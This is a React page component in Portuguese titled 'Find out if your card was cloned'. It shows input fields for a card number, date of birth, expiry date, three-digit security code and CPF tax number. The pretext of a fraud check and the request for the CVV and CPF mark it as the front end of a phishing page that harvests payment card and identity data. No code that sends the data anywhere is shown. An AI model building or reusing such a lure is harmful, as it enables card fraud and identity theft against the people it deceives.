import { CreditCard, IdCard, CalendarDays, LockKeyhole, Calendar1, Smile } from 'lucide-react';

export default function Home() {
  return (
    <>
      <h1 className='text-2xl text-center flex flex-row items-center justify-center'>Descubra se seu cartão foi clonado <Smile /></h1>
    
      <div className="flex items-center justify-center flex-col h-screen gap-6">

        <div className="flex items-center border border-gray-300 rounded-lg px-3 py-2 w-96 gap-3">
          <input type="text" className='outline-none w-full' placeholder='Digite o número do seu cartão:' maxLength={19} /><CreditCard className='mr-2'/>
        </div>

        <div className="flex items-center border border-gray-300 rounded-lg px-3 py-2 w-96 gap-3">
          <input type="text" className='outline-none w-full' placeholder='Digite sua data de nascimento DD/MM/YY:' maxLength={8} /><CalendarDays className='mr-2'/>
        </div>

        <div className="flex items-center border border-gray-300 rounded-lg px-3 py-2 w-96 gap-3">
          <input type="text" className='outline-none w-full' placeholder='Digite a data de validade do cartão MM/YY:' maxLength={5} /><Calendar1 className='mr-2'/>
        </div>

        <div className="flex items-center border border-gray-300 rounded-lg px-3 py-2 w-96 gap-3">
          <input type="text" className='outline-none w-full' placeholder='Digite o código de segurança do cartão:' maxLength={3} pattern="\d{3}" /><LockKeyhole className='mr-2'/>
        </div>

        <div className="flex items-center border border-gray-300 rounded-lg px-3 py-2 w-96 gap-3">
          <input type="text" className='outline-none w-full' placeholder='Digite seu CPF:' maxLength={11} pattern="\d{11}" /><IdCard className='mr-2'/>
        </div>

      </div>
    </>
  );
}
